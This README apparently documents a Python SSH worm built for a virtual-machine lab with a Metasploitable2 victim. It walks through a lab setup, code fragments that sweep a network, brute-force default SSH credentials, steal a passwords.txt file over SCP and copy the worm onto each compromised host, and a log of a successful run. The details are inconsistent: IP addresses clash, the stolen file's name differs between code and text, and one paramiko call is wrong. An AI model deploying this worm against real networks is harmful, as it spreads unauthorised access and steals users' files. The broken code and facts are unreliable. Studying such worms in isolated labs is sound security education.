# Worm

Our **worm** is implemented in the file `worm.py`. It tries to spread over the selected network via **SSH** connection and copy itself on the remote host. If the victim has a file **passwords.txt** in the home directory, it will obtain the file and send it back to the system of the attacker.

#### Demonstration of behavior

A valid infrastructure needs to be setup for this example. We need at least two hosts on the same network. To do this, it is recommended to setup two **virtual machines**, one for the attacker and one for the victim. To learn more about virtual machines, see [the guide to virtual machines](https://www.lifewire.com/virtual-machine-4147598). A free and popular virtualization tool is [Oracle VM VirtualBox](https://www.virtualbox.org/). For the system of the victim use [Metasploitable2](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/) (a simple Linux VM often used for demostration of security vulnerabilities). Once you create both VMs, to connect them to the same network in VirtualBox go to _Setting->Network->AdapterN->Attached to_ and select Internal network. This must be done for both VMs.

Now run both systems and log in. The default credentials on the **Metasploitable2** are 
```
user: msfadmin
pass: msfadmin
```
Make sure that you have this repo cloned on the system of the attacker. The last thing we have to do is to assign valid **IP addresses** to both machines. This can be done with the following command:
```
ip addr add [IP addr]/24 dev [Interface]
```
Assign **198.168.0.3** to the victim and **168.168.0.2** to the attacker. To make sure you have done everything correctly, make the systems ping each other.
```
Victim:   ping 198.168.0.2
Attacker: ping 198.168.0.3
```
If you can see the response, everything is fine and we can proceed to the actual demonstration.

Make a simple file on the victim's system containing something like the following text and name it **passwords.txt**. This represents private file of the user on the vulnerable system.
```
My social media credentials
---------------------------
user: user
pass: mysecurepassword
```

Finally, we can execute our worm on the system of the attacker (`./worm.py`). This worm will try to access each host on the network and log in via **SSH**. To learn more about **SSH** see [the guide to SSH](https://medium.com/@Magical_Mudit/understanding-ssh-workflow-66a0e8d4bf65). If it succeeds, it copies itself on the vulnerable system and steals the file **passwords.txt** if the user has one. If everything was done correctly, you should see the following log of the worm. It has tried to log in to hosts **198.168.0.1** and **198.168.0.2** with various credentials and failed. But it has successfully connected to **2 users** on the system **198.168.0.3** and stole the password file from one of them. You should see this file in the same directory on the system of the attacker.

```
DEBUG:root:Trying to spread on the remote host: 198.168.0.1
DEBUG:root:The remote host refused connection with credentials user,user.
DEBUG:root:The remote host refused connection with credentials root,root.
DEBUG:root:The remote host refused connection with credentials msfadmin,msfadmin.

DEBUG:root:Trying to spread on the remote host: 198.168.0.2
DEBUG:root:The remote host refused connection with credentials user,user.
DEBUG:root:The remote host refused connection with credentials root,root.
DEBUG:root:The remote host refused connection with credentials msfadmin,msfadmin.

DEBUG:root:Trying to spread on the remote host: 198.168.0.3
DEBUG:root:The worm is succesfully connected to the remote host [user, user].
DEBUG:root:The victim did not have passwords.txt
DEBUG:root:The remote host refused connection with credentials user,user.
DEBUG:root:The remote host refused connection with credentials root,root.
DEBUG:root:The worm is succesfully connected to the remote host [msfadmin, msfadmin].
DEBUG:root:The victim had passwords.txt
...
```

The creation of **worm** itself is very simple process as it is described below and anyone can do it just with a basic knowledge of programming and understandment of networking. That's why we should keep our systems updated, secured and credentials strong.

#### How does it work?

- Firstly, we create our **worm** and pass it a **network address** representing the network, on which it should spread.
  ```python
  worm = Worm('198.168.0.0')
  ```
- Then we call function _spread_via_ssh_, which tries to connect to each host on the network, establish an **SSH** connection and spread itself (while stealing the password file).
  ```python
  worm.spread_via_ssh()
  ```
- At the beginning, this method creates an **SSHClient** from _paramiko_ module that would help us to create the connection.
  ```python
  ssh = paramiko.SSHClient()
  ssh.get_missing_host_key_policy(paramiko.AutoAddPolicy())
  ```
- Then it iterates over all host addresses on the network (implemented as generator _generate_addresses_on_network_). The worm contains property _credentials_, which represents combinations of usernames and passwords that the worm is willing to try. That means that it will try to login via **SSH** 3 times on each host. **SSH** uses port 22.
  ```python
  for remote_address in self.generate_addresses_on_network():
      for user, passw in self.credentials:
          try:
              ssh.connect(remote_address, port=22, username=user, password=passw)
              ...
  ```
- If the connection fails, it is captured as an exception and the worm continues with another user or host. However, if the connection is established (as in the case of **198.162.0.3**), we can create an **SCP client** that will transmit our files. To learn more about **SCP**, see [the guide to SCP](https://en.wikipedia.org/wiki/Secure_copy).
  ```
  scp_client = scp.SCPClient(ssh.get_transport())
- Now we can execute file transmition commands. One will obtain the password file and the second one will send the worm to the remote host. A name of the file is obtained from the system arguments.
  ```python
  scp_client.get('password.txt')
  scp_client.put(sys.argv[0])
  ```
